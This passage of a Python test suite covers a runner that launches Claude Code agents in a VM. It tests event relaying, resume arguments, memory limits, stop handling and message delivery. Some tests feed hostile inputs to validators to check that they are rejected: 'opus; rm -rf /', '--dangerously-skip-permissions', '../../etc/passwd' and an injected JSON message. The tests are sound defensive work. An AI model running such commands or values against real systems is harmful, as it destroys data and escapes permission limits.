        for bad in (-5, True, "7", 1.5):
            relay.feed(json.dumps({"type": "assistant", "message": {"model": "m", "content": [], "usage": {"input_tokens": bad}}}))
        used(99)
        relay.close()  # the last one is never lost
        self.assertEqual([m["used"] for m in context()], [2, 50, 100])

    def test_chat_relay_subagents(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        relay = self.r.ChatRelay(Ctl(), "t1")
        for x in [
            {"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "ag1", "name": "Agent", "input": {
                "description": "Find the recipe API", "prompt": "Look through src/ for recipe registration.",
                "subagent_type": "Explore", "run_in_background": True}}]}},
            {"type": "system", "subtype": "task_started", "task_id": "x1", "tool_use_id": "ag1", "description": "Find the recipe API",
             "subagent_type": "Explore", "is_backgrounded": True},
            {"type": "assistant", "parent_tool_use_id": "ag1", "message": {"content": [
                {"type": "tool_use", "id": "c1", "name": "Grep", "input": {"pattern": "Recipe"}}]}},
            {"type": "user", "parent_tool_use_id": "ag1", "message": {"content": [
                {"type": "tool_result", "tool_use_id": "c1", "content": "src/A.java\nsrc/B.java"}]}},
            {"type": "system", "subtype": "task_progress", "tool_use_id": "ag1", "usage": {"tool_uses": 1, "total_tokens": 900, "duration_ms": 1500},
             "last_tool_name": "Grep"},
            {"type": "system", "subtype": "task_progress", "tool_use_id": "ag1", "usage": {"tool_uses": 2}},  # too soon: dropped
            {"type": "system", "subtype": "task_notification", "task_id": "x1", "tool_use_id": "ag1", "status": "completed",
             "summary": "Found it in A.java", "usage": {"tool_uses": 3, "total_tokens": 2000, "duration_ms": 4000}},
            {"type": "system", "subtype": "task_notification", "tool_use_id": "ag2", "status": "evil"}]:
            relay.feed(json.dumps(x))
        relay.close()
        ev = [e for m in sent for e in m["events"]]
        self.assertEqual([e["k"] for e in ev], ["tool", "sub", "tool", "result", "sub", "sub", "sub"])
        self.assertEqual((ev[0]["sub"], ev[0]["bg"], ev[0]["detail"]), ("Explore", True, "Look through src/ for recipe registration."))
        self.assertEqual(ev[1], {"k": "sub", "id": "ag1", "state": "running", "desc": "Find the recipe API", "sub": "Explore", "bg": True})
        self.assertEqual((ev[2]["parent"], ev[3]["parent"]), ("ag1", "ag1"))
        self.assertEqual((ev[4]["tools"], ev[4]["last"]), (1, "Grep"))
        self.assertEqual((ev[5]["state"], ev[5]["tools"], ev[5]["summary"]), ("completed", 3, "Found it in A.java"))
        self.assertEqual(ev[6]["state"], "running")  # unknown status: never passed through
        from cilly.vm import _clean_chat_event
        self.assertEqual([_clean_chat_event(e) for e in ev], ev)
        self.assertIsNone(_clean_chat_event({"k": "sub", "id": "x", "state": "<b>"}))
        self.assertNotIn("bg", _clean_chat_event({"k": "tool", "id": "x", "bg": "yes"}))

    def test_copy_inject_into_scratch_never_overwrites(self):
        with tempfile.TemporaryDirectory() as d:
            src, dst = os.path.join(d, "inject"), os.path.join(d, "scratch")
            os.makedirs(os.path.join(src, "src", "deep"))
            for rel, body, mode in (("package.json", "{}", 0o444), ("run.sh", "#!/bin/sh", 0o555), ("src/deep/a.txt", "a", 0o444)):
                with open(os.path.join(src, rel), "w") as f:
                    f.write(body)
                os.chmod(os.path.join(src, rel), mode)
            os.symlink("deep/a.txt", os.path.join(src, "src", "link.txt"))
            os.makedirs(dst)
            with open(os.path.join(dst, "package.json"), "w") as f:
                f.write('{"mine": true}')  # earlier work in ~/scratch
            r = self.r._h_copy_inject(src, dst)
            self.assertEqual(r, {"copied": 3, "kept": 1})
            with open(os.path.join(dst, "package.json")) as f:
                self.assertIn("mine", f.read())
            self.assertEqual(os.stat(os.path.join(dst, "run.sh")).st_mode & 0o777, 0o755)  # now editable
            self.assertEqual(os.stat(os.path.join(dst, "src", "deep", "a.txt")).st_mode & 0o777, 0o644)
            self.assertEqual(os.readlink(os.path.join(dst, "src", "link.txt")), "deep/a.txt")
            self.assertEqual(self.r._h_copy_inject(src, dst), {"copied": 0, "kept": 4})  # next start: nothing replaced

    def test_conversation_args(self):
        sid = "0b3e8f4c-1d2a-4c5b-9e6f-7a8b9c0d1e2f"
        state = {"conversation": {"/w": True}}
        cont = {"continue": True, "continue_args": ["--continue"]}
        self.assertEqual(self.r.conversation_args(cont, state, "/w"), ["--continue"])
        self.assertEqual(self.r.conversation_args(cont, state, "/other"), [])  # nothing to continue yet
        self.assertEqual(self.r.conversation_args({"continue": False}, state, "/w"), [])
        with mock.patch.object(self.r, "as_agent", return_value=True) as aa:
            self.assertEqual(self.r.conversation_args(dict(cont, resume=sid), state, "/w"), ["--resume", sid])
            aa.assert_called_once_with("has_session", sid)
        with mock.patch.object(self.r, "as_agent", return_value=False):
            with self.assertRaisesRegex(RuntimeError, "no longer in this VM"):
                self.r.conversation_args(dict(cont, resume=sid), state, "/w")
        for bad in ("--help", "../x", sid.upper(), sid + "\n", 5):  # never reaches argv
            self.assertEqual(self.r.conversation_args(dict(cont, resume=bad), state, "/w"), ["--continue"])
        self.assertFalse(self.r._h_has_session("../../etc/passwd"))

    def test_model_flag_only_when_valid(self):
        base = {"instructions": "hi", "agent_argv": ["claude", "-p", "{instructions}"]}
        argv = lambda t: self.r.claude_argv(t)[0]  # noqa: E731
        self.assertEqual(argv(base), ["claude", "-p"])
        self.assertEqual(argv(dict(base, model="opus"))[-2:], ["--model", "opus"])
        self.assertEqual(argv(dict(base, model="claude-opus-5-5[1m]"))[-1], "claude-opus-5-5[1m]")
        for bad in ("--dangerously-skip-permissions", "opus; rm -rf /", "Opus", "", None, 5, "x" * 80):
            self.assertNotIn("--model", argv(dict(base, model=bad)), bad)
        self.assertEqual(argv(dict(base, effort="xhigh"))[-2:], ["--effort", "xhigh"])
        for bad in ("extreme", "--model", "", None):
            self.assertNotIn("--effort", argv(dict(base, effort=bad)), bad)

    def test_the_prompt_goes_on_stdin(self):
        from cilly.config import ARGV_CLAUDE
        for text in ("- fix X\n- add a test", "--help", "--dangerously-skip-permissions do it", "x" * 300_000):
            argv, prompt = self.r.claude_argv({"instructions": text, "agent_argv": ARGV_CLAUDE, "permission_mode": "dontAsk"})
            self.assertEqual(prompt, text)
            self.assertEqual(argv, ["claude", "-p", "--permission-mode", "dontAsk", "--output-format", "stream-json", "--verbose"])
        # a command without {instructions} on its own still gets it filled in, as before
        argv, prompt = self.r.claude_argv({"instructions": "hi", "agent_argv": ["tool", "--prompt={instructions}"]})
        self.assertEqual((argv, prompt), (["tool", "--prompt=hi"], None))
        for cmd, stdin in ((["claude", "--print", "{instructions}"], True), (["/usr/local/bin/claude", "-p", "{instructions}"], True),
                           (["aider", "--message", "{instructions}"], False), (["claude", "{instructions}"], False),
                           (["my-agent", "-p", "{instructions}"], False)):
            argv, prompt = self.r.claude_argv({"instructions": "- fix X", "agent_argv": cmd})
            self.assertEqual(prompt is not None, stdin, cmd)
            self.assertEqual("- fix X" in argv, not stdin, cmd)  # other commands keep it as an argument

    def as_me(self):
        """run_as_agent as ourselves: the agent user doesn't exist here."""
        real = subprocess.Popen

        def popen(argv, **kw):
            for k in ("user", "group", "extra_groups"):
                kw.pop(k, None)
            return real(argv, **kw)
        return mock.patch.multiple(self.r, subprocess=mock.Mock(Popen=popen, PIPE=subprocess.PIPE, DEVNULL=subprocess.DEVNULL,
                                                                STDOUT=subprocess.STDOUT),
                                   pwd=mock.Mock(getpwnam=lambda n: pwd.getpwuid(os.getuid())))

    def test_run_as_agent_feeds_the_prompt_on_stdin(self):
        out = []
        with self.as_me(), mock.patch.object(self.r, "log", out.append):
            self.r.run_as_agent([sys.executable, "-c", "import sys; print(sys.stdin.read()[:12])"], dict(os.environ), self.d,
                                stdin_text="- fix X\n" + "y" * 500_000)
        self.assertEqual(out[1:], ["| - fix X\n", "| yyyy\n"])  # the child read it, a line starting with "-" too

    def fake_systemd_run(self, groups):
        """Records its words, then runs what follows -- as the scope would, printing `groups` for id -G."""
        path, calls = os.path.join(self.d, "systemd-run"), os.path.join(self.d, "systemd-run.calls")
        with open(path, "w") as f:
            f.write(f'#!/bin/sh\nprintf "%s\\n" "$*" >> {calls}\n'
                    'while [ "$1" != "--" ]; do shift; done; shift\n'
                    f'if [ "$*" = "/bin/sh -c id -u; id -g; id -G" ]; then id -u; id -g; echo {groups}; exit 0; fi\nexec "$@"\n')
        os.chmod(path, 0o755)
        return path, calls

    def test_claude_code_runs_under_a_memory_limit_once_checked(self):
        me = pwd.getpwuid(os.getuid())
        tool, calls = self.fake_systemd_run(f"{me.pw_gid}")
        out, users = [], []
        with mock.patch.object(self.r, "SYSTEMD_RUN", tool), mock.patch.object(self.r, "agent_memory_kib", lambda: 15 << 20), \
                mock.patch.object(self.r.pwd, "getpwnam", return_value=me), mock.patch.object(self.r, "log", out.append):
            self.r.check_memory_limit()
        self.assertEqual(self.r.MEMORY_LIMIT["kib"], 15 << 20)
        first = open(calls).read()
        self.assertIn(f"--scope --quiet --collect --uid={me.pw_uid} --gid={me.pw_gid} -p MemoryMax={15 << 20}K "
                      "-p MemorySwapMax=0 -p OOMPolicy=continue -- /bin/sh -c id -u; id -g; id -G", first)
        self.assertIn("memory: Claude Code runs get at most 15360 MiB", "".join(out))
        real = subprocess.Popen

        def popen(argv, **kw):  # who it would run as: systemd-run switches users itself, so Popen mustn't
            users.append((argv[0], kw.pop("user", None), kw.pop("group", None), kw.pop("extra_groups", None)))
            return real(argv, **kw)
        # the task's Claude Code run goes into the scope; other agent commands, a git push say, don't
        with self.as_me(), mock.patch.object(self.r.subprocess, "Popen", popen), mock.patch.object(self.r, "log", out.append):
            self.r.run_as_agent([sys.executable, "-c", "print('ran')"], dict(os.environ), self.d, stoppable=True)
            self.r.run_as_agent([sys.executable, "-c", "print('git')"], dict(os.environ), self.d)
        self.assertEqual(users, [(tool, None, None, None), (sys.executable, me.pw_uid, me.pw_gid, [])])
        runs = open(calls).read()[len(first):].splitlines()
        self.assertEqual(len(runs), 1)
        self.assertTrue(runs[0].endswith(f"-- {sys.executable} -c print('ran')"), runs)
        self.assertIn("| ran\n", out)
        self.assertIn("| git\n", out)

    def test_no_memory_limit_unless_systemd_switches_users_exactly(self):
        me = pwd.getpwuid(os.getuid())
        tool, calls = self.fake_systemd_run(f"{me.pw_gid} 27")  # a group more than Popen gives: not used
        out = []
        with mock.patch.object(self.r, "SYSTEMD_RUN", tool), mock.patch.object(self.r, "agent_memory_kib", lambda: 15 << 20), \
                mock.patch.object(self.r.pwd, "getpwnam", return_value=me), mock.patch.object(self.r, "log", out.append):
            self.r.check_memory_limit()
        self.assertNotIn("argv", self.r.MEMORY_LIMIT)
        with self.as_me(), mock.patch.object(self.r, "log", out.append):
            self.r.run_as_agent([sys.executable, "-c", "print('ran')"], dict(os.environ), self.d, stoppable=True)
        self.assertEqual(len(open(calls).read().splitlines()), 1)  # only the check: the run started as before
        self.assertIn("memory: no limit for Claude Code runs", "".join(out))
        self.assertTrue(self.r.MEMORY_CHECKED.is_set())
        with mock.patch.object(self.r, "SYSTEMD_RUN", os.path.join(self.d, "missing")), mock.patch.object(self.r, "agent_memory_kib", lambda: 15 << 20), \
                mock.patch.object(self.r.pwd, "getpwnam", return_value=me), mock.patch.object(self.r, "log", out.append):
            self.r.check_memory_limit()
        self.assertNotIn("argv", self.r.MEMORY_LIMIT)

    def test_the_check_command_says_who_it_runs_as(self):
        """Run for real: id takes one of -u, -g and -G at a time, so a single id call would always fail the check."""
        r = subprocess.run(list(self.r.ID_CHECK), capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout.split("\n")[:2], [str(os.getuid()), str(os.getgid())])

    def test_the_memory_limit_leaves_a_reserve(self):
        gib = 1 << 20  # in KiB, as /proc/meminfo has it
        for total, want in ((16 * gib, 16 * gib - 16 * gib // 10), (4 * gib, 4 * gib - gib // 2), (64 * gib, 62 * gib),
                            (gib, gib // 2), (gib * 3 // 4, None)):
            with mock.patch("builtins.open", mock.mock_open(read_data=f"MemTotal: {total} kB\nMemFree: 1 kB\n")):
                self.assertEqual(self.r.agent_memory_kib(), want, total)

    def test_a_message_that_cant_be_encoded_fails_the_task(self):
        started = []
        with mock.patch.object(self.r.pwd, "getpwnam", return_value=pwd.getpwuid(os.getuid())), \
                mock.patch.object(self.r.subprocess, "Popen", side_effect=lambda *a, **k: started.append(a)), \
                mock.patch.object(self.r, "log", lambda m: None):
            with self.assertRaisesRegex(RuntimeError, "isn't valid Unicode"):
                self.r.run_as_agent(["claude", "-p"], {}, self.d, stdin_text="fix \ud800 this", stoppable=True)
        self.assertEqual(started, [])  # Claude never started with an empty prompt

    def test_run_as_agent_closes_its_pipe(self):
        import gc
        import warnings
        gc.collect()  # what earlier tests left behind is closed now, not inside the window below
        with self.as_me(), mock.patch.object(self.r, "log", lambda m: None), warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always", ResourceWarning)
            before = len(os.listdir("/proc/self/fd"))
            for _ in range(30):  # one task after another
                self.r.run_as_agent(["true"], dict(os.environ), self.d, quiet=True)
                self.r.run_as_agent([sys.executable, "-c", "pass"], dict(os.environ), self.d, quiet=True, stdin_text="x")
            time.sleep(0.2)
            gc.collect()
            self.assertLessEqual(len(os.listdir("/proc/self/fd")), before)
        self.assertEqual([str(x.message) for x in w if issubclass(x.category, ResourceWarning)], [])

    def test_stop_lets_the_task_finish_before_the_memory_export(self):
        r, events = self.r, []
        lock = threading.Lock()

        def note(e):
            with lock:
                events.append(e)

        def task(slow):
            rc = r.run_as_agent(["sleep", "30"], dict(os.environ), self.d, check=False, quiet=True, stoppable=True)  # Claude Code
            note(f"run ended {'killed' if rc else rc}")
            time.sleep(slow)
            note("state saved")
            r.kill_agent_processes()
            note("task cleaned up")

        def export():
            note("export start")
            time.sleep(0.5)
            note("export end")
        def stop(slow):
            events.clear()
            r.STOPPING.clear()  # a new VM each time
            with self.as_me(), mock.patch.multiple(r, log=lambda m: None, export_memory=export, TASK_STOP_WAIT=0.5,
                                                   _pkill_agent=lambda: note("pkill") or False):
                r.subprocess.run = lambda argv, **k: note("off") if argv[-1] == "poweroff" else None
                th = threading.Thread(target=task, args=(slow,))
                th.start()
                time.sleep(0.3)
                self.assertEqual(events, [])  # still working
                r.shutdown({"export_memory": True}, th)
                th.join(5)
            return list(events)
        # the task finishes up (its state saved whole) before the memory is exported
        self.assertEqual(stop(0.1), ["run ended killed", "state saved", "pkill", "task cleaned up",
                                     "pkill", "export start", "export end", "off"])
        # one that takes longer than Stop waits: it can't kill the export's packer
        ev = stop(0.7)
        self.assertLess(ev.index("export start"), ev.index("state saved"))
        self.assertLess(ev.index("state saved"), ev.index("export end"))
        self.assertGreater(len(ev) - 1 - ev[::-1].index("pkill"), ev.index("export end"))  # the task's kill came after

    def test_stop_ends_only_claude(self):
        r = self.r
        env = dict(os.environ)
        with self.as_me(), mock.patch.object(r, "log", lambda m: None):
            # Stop during the first git clone: the clone isn't Claude, so it finishes
            done = []
            th = threading.Thread(target=lambda: done.append(r.run_as_agent(["sh", "-c", "sleep 1"], env, self.d, check=False, quiet=True)))
            th.start()
            time.sleep(0.3)
            r.STOPPING.set()
            r.stop_current_run()
            th.join(10)
            self.assertEqual(done, [0])
            # Stop just before Claude starts: it ends at once, not after the whole wait
            t0 = time.time()
            rc = r.run_as_agent(["sleep", "30"], env, self.d, check=False, quiet=True, stoppable=True)
            self.assertNotEqual(rc, 0)
            self.assertLess(time.time() - t0, 10)
            # the final push after Stop still runs to the end
            self.assertEqual(r.run_as_agent(["sh", "-c", "sleep 0.3; exit 0"], env, self.d, check=False, quiet=True), 0)

    def test_claude_doesnt_start_once_stop_is_under_way(self):
        r, sent, saved, started = self.r, [], [], []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        r.STOPPING.set()  # Stop came during the clone, before Claude
        with mock.patch.multiple(r, agent_env=lambda b, t: {}, home_dir=lambda *p: "/x/" + "/".join(p), log=lambda m: None,
                                 ensure_agent_dir=lambda p: None, load_state=lambda: {}, save_state=saved.append,
                                 conversation_args=lambda *a: [], kill_agent_processes=lambda: None,
                                 report_outbox_images=lambda *a: None, send_research_requests=lambda *a: None, send_questions=lambda *a: None), \
                mock.patch.object(r.subprocess, "Popen", side_effect=lambda *a, **k: started.append(a)):
            r.run_scratch_task({}, {"id": "t1", "instructions": "hi", "agent_argv": ["claude", "-p", "{instructions}"]}, Ctl())
        self.assertEqual((started, saved), ([], []))  # no run, and no conversation for the next task to continue
        self.assertEqual((sent[-1]["state"], sent[-1]["error"]), ("failed", "stopped before Claude Code started"))

    def test_runner_has_no_third_party_imports(self):
        with open(RUNNER) as f:
            src = f.read()
        for line in src.splitlines():
            if line.startswith(("import ", "from ")):
                mod = line.split()[1].split(".")[0]
                self.assertIn(mod, {"base64", "difflib", "hashlib", "json", "os", "pwd", "queue", "re", "select", "shutil", "signal",
                                    "subprocess", "sys", "tarfile", "threading", "time", "urllib", "uuid", "zlib"}, line)


class AgentSideTests(unittest.TestCase):
    """Runner code that works in the agent's home (as the agent user)."""
    def _files_tree(self):
        out = os.path.join(self.d, "outbox")
        os.makedirs(os.path.join(out, "notes"))
        os.makedirs(os.path.join(out, ".git"))
        with open(os.path.join(out, "report.md"), "w") as f:
            f.write("hello\n")
        with open(os.path.join(out, "notes", "a.txt"), "w") as f:
            f.write("x" * 100)
        secret = os.path.join(self.d, "secret.txt")
        with open(secret, "w") as f:
            f.write("not for you")
        os.symlink(secret, os.path.join(out, "link.txt"))
        os.symlink(self.d, os.path.join(out, "up"))
        return out

    def _call(self, fn, msg):
        sent = []

        class Ctl:
            def send(self, **kw):
                sent.append(kw)
        fn({}, {"id": "abc123", "what": "outbox", **msg}, Ctl())
        return sent

    def test_only_new_work_opens_a_pull_request(self):
        new = self.r.has_new_work
        self.assertTrue(new(2, "b", "a", "a"))         # committed this turn
        self.assertFalse(new(2, "b", "b", "b"))        # just talking: a PR you closed stays closed
        self.assertFalse(new(2, "b", "b", ""))         # merged, and its branch deleted
        self.assertTrue(new(2, "b", "b", "a"))         # the last push didn't make it
        self.assertFalse(new(0, "b", "a", "a"))        # nothing that main doesn't have

    def test_leftover_work_gets_a_real_commit_message(self):
        s = self.r.leftover_subject
        self.assertEqual(s(["A\tbanana.txt"]), "Add banana.txt")
        self.assertEqual(s(["M\tsrc/a/SellCommand.java", "M\tplugin.yml"]), "Update SellCommand.java and plugin.yml")
        self.assertEqual(s(["A\tnew.txt", "M\told.txt"]), "Add new.txt, update old.txt")
        self.assertEqual(s(["R100\ta.txt\tb.txt"]), "Rename b.txt")
        self.assertEqual(s([f"M\tf{i}.txt" for i in range(5)]), "Update 5 files")
        self.assertEqual(s(["A\tx", "D\ty", "M\tz", "M\tw"]), "Update 4 files")
        self.assertEqual(s([]), "Commit remaining work")

    def test_pull_request_text_comes_from_the_agent(self):
        import time as _t
        note = os.path.join(self.d, "pull-request.md")
        self.assertIsNone(self.r._h_read_pr_note(note, 0))
        open(note, "w").write("# Skip popup rules without a match\n\nThey matched every message.\n")
        got = self.r._h_read_pr_note(note, _t.time() - 5)
        title, body = self.r.pr_text(got, ["Skip empty rules", "Commit remaining work"], "Review the code and fix it.")
        self.assertEqual(title, "Skip popup rules without a match")
        self.assertTrue(body.startswith("They matched every message."))
        self.assertIn("- Skip empty rules", body)
        self.assertIn("> Review the code and fix it.", body)  # the request, folded away
        self.assertIsNone(self.r._h_read_pr_note(note, _t.time() + 60))  # an old note from an earlier turn
        os.remove(note)
        os.symlink("/etc/hostname", note)
        self.assertIsNone(self.r._h_read_pr_note(note, 0))
        # no note: one commit names it, else the request does; a title you gave wins
        self.assertEqual(self.r.pr_text(None, ["Fix the nav"], "x")[0], "Fix the nav")
        self.assertEqual(self.r.pr_text(None, ["a", "b"], "Fix it")[0], "Fix it")
        self.assertEqual(self.r.pr_text(got, [], "x", "My title")[0], "My title")
        self.assertNotIn("\x1b", self.r.pr_text({"title": "a\x1b[31mb", "body": ""}, [], "x")[0])

    def test_summary_is_read_as_one_line_without_following_links(self):
        path = os.path.join(self.d, "status.txt")
        self.assertIsNone(self.r._h_read_summary(path))
        open(path, "w").write("\n  Added per-site ports, tests pass  \nsecond line\n")
        self.assertEqual(self.r._h_read_summary(path), "Added per-site ports, tests pass")
        open(path, "w").write("x" * 5000)
        self.assertEqual(len(self.r._h_read_summary(path)), 200)
        os.remove(path)
        os.symlink("/etc/hostname", path)
        self.assertIsNone(self.r._h_read_summary(path))
        os.remove(path)
        os.mkfifo(path)  # nobody writes to it: the read must not hang
        self.assertIsNone(self.r._h_read_summary(path))

    def test_summary_is_sent_when_it_changes(self):
        sent = []

        class Ctl:
            def send(self, **kw):
                sent.append(kw)
        texts = iter(["Working on the tests", "Working on the tests", None, "Tests pass, PR open"])
        with mock.patch.object(self.r, "as_agent", lambda *a, **k: next(texts)):
            for _ in range(4):
                self.r.send_summary(Ctl())
        self.assertEqual(sent, [{"type": "summary", "text": "Working on the tests"},
                                {"type": "summary", "text": "Tests pass, PR open"}])

    def test_a_queued_task_sent_the_moment_the_last_one_ends_runs(self):
        """The panel sends the next queued task as soon as the final status arrives, from the runner's
        control loop (another thread).  Nothing slow may come between that status and the lock's release."""
        r, sent, second = self.r, [], {}

        class Ctl:
            def send(self, **m):
                sent.append(m)
                if m.get("type") == "status" and m.get("task") == "t1" and m.get("state") == "done":
                    th = threading.Thread(target=lambda: second.update(th=r.start_task({}, {"id": "t2"}, self)))
                    th.start()
                    second["starter"] = th

        def scratch(boot, task, ctl):
            if task["id"] == "t1":
                ctl.send(type="status", task="t1", state="done")

        def slow_helper(*a, **k):  # reading ~/status.txt starts a process as the agent
            time.sleep(0.3)
            return "Done, nothing left"
        with mock.patch.object(r, "run_scratch_task", scratch), mock.patch.object(r, "as_agent", slow_helper):
            r.start_task({}, {"id": "t1"}, Ctl()).join(10)
            second["starter"].join(10)
            second["th"].join(10)
        self.assertNotIn({"type": "status", "task": "t2", "state": "failed", "error": "agent is busy"}, sent)
        self.assertIsNotNone(second["th"])
        kinds = [(m["type"], m.get("task"), m.get("state")) for m in sent]
        self.assertLess(kinds.index(("summary", None, None)), kinds.index(("status", "t1", "done")))  # read before the status
        self.assertFalse(r.TASK_BUSY.locked())

    def test_a_failing_end_step_still_lets_go_of_the_task(self):
        r, sent = self.r, []

        class Ctl:
            def send(self, **m):
                sent.append(m)

        def scratch(boot, task, ctl):
            ctl.send(type="status", task=task["id"], state="done")
        with mock.patch.object(r, "run_scratch_task", scratch), \
                mock.patch.object(r, "as_agent", side_effect=ValueError("not JSON")):
            r.start_task({}, {"id": "t1"}, Ctl()).join(10)
        self.assertFalse(r.TASK_BUSY.locked())
        self.assertIn({"type": "status", "task": "t1", "state": "done"}, sent)
        hold = threading.Event()  # a task that is really running: the next one is refused at once
        with mock.patch.object(r, "run_scratch_task", lambda boot, task, ctl: hold.wait(10)), \
                mock.patch.object(r, "as_agent", lambda *a, **k: None):
            running = r.start_task({}, {"id": "t2"}, Ctl())
            started = time.time()
            self.assertIsNone(r.start_task({}, {"id": "t3"}, Ctl()))
            self.assertLess(time.time() - started, 1)
            hold.set()
            running.join(10)
        self.assertEqual(sent[-1], {"type": "status", "task": "t3", "state": "failed", "error": "agent is busy"})

    def test_the_summary_watch_survives_any_error(self):
        r, sent = self.r, []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        answers = iter([ValueError("bad"), KeyError("x"), "Still working"])

        def helper(*a, **k):
            v = next(answers)
            if isinstance(v, Exception):
                raise v
            return v
        done = threading.Event()
        with mock.patch.object(r, "as_agent", helper), mock.patch.object(r, "SUMMARY_EVERY", 0.05):
            th = threading.Thread(target=r.watch_summary, args=(Ctl(), done))
            th.start()
            deadline = time.time() + 5
            while not sent and time.time() < deadline:
                time.sleep(0.02)
            done.set()
            th.join(5)
        self.assertEqual(sent, [{"type": "summary", "text": "Still working"}])

    def test_each_task_ends_by_sending_the_summary(self):
        sent = []

        class Ctl:
            def send(self, **kw):
                sent.append(kw)
        with mock.patch.object(self.r, "run_scratch_task", lambda boot, task, ctl: None), \
                mock.patch.object(self.r, "as_agent", lambda *a, **k: "Done, nothing left"):
            self.assertTrue(self.r.TASK_BUSY.acquire(blocking=False))
            self.r._task_worker({}, {"id": "t1"}, Ctl())
        self.assertIn({"type": "summary", "text": "Done, nothing left"}, sent)

    FAKE_BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fake_bin")

    def _live(self, during=None, timeout_s=30, **knobs):
        """run_claude with the fake Claude Code (tests/fake_bin/claude), the way a task runs it.
        during(sent, ctl) runs while it works.  Returns what was sent, the exit code and how long it took."""
        r, sent = self.r, []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        env = {"PATH": self.FAKE_BIN + os.pathsep + os.environ["PATH"], "FAKE_CLAUDE_DIR": self.d,
               "FAKE_CLAUDE_TURN": "3", **knobs}
        task = {"id": "t1", "instructions": "work", "timeout_s": timeout_s,
                "agent_argv": ["claude", "-p", "{instructions}", "--output-format", "stream-json", "--verbose"]}
        r.STREAM_INPUT.clear()
        done = []
        with mock.patch.multiple(r, load_state=lambda: {}, save_state=lambda st: None, conversation_args=lambda *a: []):
            r.TASK_RUN.update(id="t1", claude_over=False)
            try:
                start = time.time()
                th = threading.Thread(target=lambda: done.append(r.run_claude(task, Ctl(), env, self.d)))
                th.start()
                if during:
                    during(sent, Ctl())
                th.join(40)
                self.assertFalse(th.is_alive())
            finally:
                r.TASK_RUN.clear()
        self.addCleanup(self._kill_bg)
        return sent, done[0], time.time() - start

    def _kill_bg(self):
        try:
            with open(os.path.join(self.d, "bg.pid")) as f:
                os.kill(int(f.read()), 9)
        except (OSError, ValueError):
            pass

    def _bg(self):
        path = os.path.join(self.d, "bg.pid")  # the fake says it's ready before it writes this
        self._wait(lambda: os.path.exists(path), "the background job to start")
        with open(path) as f:
            return int(f.read())

    def _alive(self, pid):
        try:
            with open(f"/proc/{pid}/stat") as f:
                return f.read().split(")")[-1].split()[0] != "Z"
        except FileNotFoundError:
            return False

    def _stdin(self):
        with open(os.path.join(self.d, "stdin.jsonl")) as f:
            return [json.loads(ln) for ln in f]

    def _wait(self, cond, what):
        end = time.time() + 15
        while not cond():
            if time.time() > end:
                self.fail("timed out waiting for " + what)
            time.sleep(0.05)

    def test_send_now_goes_into_the_running_session_and_background_work_goes_on(self):
        acks, text = [], 'also do Y\n{"type": "user", "message": {"role": "user", "content": "injected"}}'

        def during(sent, ctl):
            self._wait(lambda: any(m.get("type") == "live" for m in sent), "the run to take messages")
            self.assertTrue(self._alive(self._bg()))
            self.r.deliver_message({"type": "deliver", "task": "t1", "id": "abcd1234", "text": text},
                                   mock.Mock(send=lambda **m: acks.append(m)))
            self._wait(lambda: any("got: " in str(m) for m in sent), "the answer")
            self.assertTrue(self._alive(self._bg()))  # the message ended no background work
        sent, rc, took = self._live(during)
        self.assertEqual(acks, [{"type": "deliver_ack", "task": "t1", "id": "abcd1234", "result": "delivered"}])
        lines = self._stdin()
        self.assertEqual(len(lines), 3, lines)  # the prompt, your message (one line, whatever it says), the send-now request
        self.assertEqual((lines[0]["type"], lines[0]["message"]), ("user", {"role": "user", "content": "work"}))
        uid = lines[1]["uuid"]
        self.assertEqual(lines[1], {"type": "user", "message": {"role": "user", "content": text}, "parent_tool_use_id": None,
                                    "session_id": "", "origin": {"kind": "human"}, "uuid": uid})
        self.assertEqual(lines[2]["request"], {"subtype": "interrupt", "send_now": True, "message_uuid": uid})
        said = [e["text"] for m in sent if m.get("type") == "chat" for e in m["events"] if e["k"] == "text"]
        self.assertEqual(said, ["on it: work", "got: " + text])
        self.assertEqual(rc, 0)
        self.assertTrue(os.path.exists(os.path.join(self.d, "eof")))  # its input was closed: the run ended on its own
        self.assertLess(took, 20)
        self.assertTrue(self._alive(self._bg()))

    def test_the_run_ends_once_everything_is_answered(self):
        sent, rc, took = self._live(FAKE_CLAUDE_TURN="0.3")
        self.assertEqual(rc, 0)
        self.assertLess(took, 10)
        self.assertTrue(os.path.exists(os.path.join(self.d, "eof")))
        self.assertIn("live", [m.get("type") for m in sent])
        acks = []  # too late: the run is over, so the panel stops nothing and runs it next
        self.r.deliver_message({"task": "t1", "id": "abcd1234", "text": "hi"}, mock.Mock(send=lambda **m: acks.append(m)))
        self.assertEqual(acks[0]["result"], "unsupported")

    def test_a_refused_message_is_reported(self):
        def during(sent, ctl):
            self._wait(lambda: any(m.get("type") == "live" for m in sent), "the run to take messages")
            self.r.deliver_message({"task": "t1", "id": "abcd1234", "text": "hi"}, ctl)
            self._wait(lambda: any(m.get("type") == "delivery" for m in sent), "the report")
        sent, rc, took = self._live(during, FAKE_CLAUDE_REFUSE="1")
        self.assertEqual([m for m in sent if m.get("type") == "delivery"],
                         [{"type": "delivery", "task": "t1", "id": "abcd1234", "state": "refused"}])
        self.assertEqual(rc, 0)
        self.assertLess(took, 15)  # nothing left to answer, so it ended on its own
        self.assertNotIn("send_now", str(self._stdin()))  # Claude Code never had it

    def test_a_message_claude_never_answers_cant_hold_the_run(self):
        def during(sent, ctl):
            self._wait(lambda: any(m.get("type") == "live" for m in sent), "the run to take messages")
            self.r.deliver_message({"task": "t1", "id": "abcd1234", "text": "hi"}, ctl)
        with mock.patch.object(self.r.LiveInput, "QUIET", 1):
            sent, rc, took = self._live(during, FAKE_CLAUDE_SILENT="1", FAKE_CLAUDE_TURN="0.5")
        self.assertEqual(rc, 0)
        self.assertLess(took, 15)

    def test_a_turn_that_never_ends_cant_hold_a_message_claude_never_took(self):
        def during(sent, ctl):
            self._wait(lambda: any(m.get("type") == "live" for m in sent), "the run to take messages")
            self.r.deliver_message({"task": "t1", "id": "abcd1234", "text": "hi"}, ctl)
        with mock.patch.object(self.r.LiveInput, "QUIET", 1):
            sent, rc, took = self._live(during, FAKE_CLAUDE_SILENT="1", FAKE_CLAUDE_HANG="1")
